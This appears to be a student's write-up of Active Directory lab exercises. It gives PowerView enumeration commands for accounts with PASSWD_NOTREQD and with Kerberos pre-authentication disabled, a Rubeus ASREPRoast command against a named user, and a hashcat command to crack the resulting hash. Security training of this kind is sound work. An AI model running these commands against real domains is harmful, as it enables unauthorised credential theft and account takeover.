# [Miscellaneous Misconfigurations](Miscellaneous%20Misconfigurations.md)
### Find another user with the passwd_notreqd field set. Submit the samaccountname as your answer. The samaccountname starts with the letter "y".

```powershell
Get-DomainUser -UACFilter PASSWD_NOTREQD | Select-Object samaccountname,useraccountcontrol
```
![](Screenshot%202026-05-31%20at%2021.06.22.png)
### Find another user with the "Do not require Kerberos pre-authentication setting" enabled. Perform an ASREPRoasting attack against this user, crack the hash, and submit their cleartext password as your answer.

```powershell
Get-DomainUser -PreauthNotRequired | select samaccountname,userprincipalname,useraccountcontrol | fl
```
![](Screenshot%202026-05-31%20at%2021.07.22.png)

```powershell
.\Rubeus.exe asreproast /user:ygroce /nowrap /format:hashcat
```
![](Screenshot%202026-05-31%20at%2021.16.30.png)

```shell
hashcat -m 18200 pass /usr/share/wordlists/rockyou.txt
```
![](Screenshot%202026-05-31%20at%2021.17.05.png)
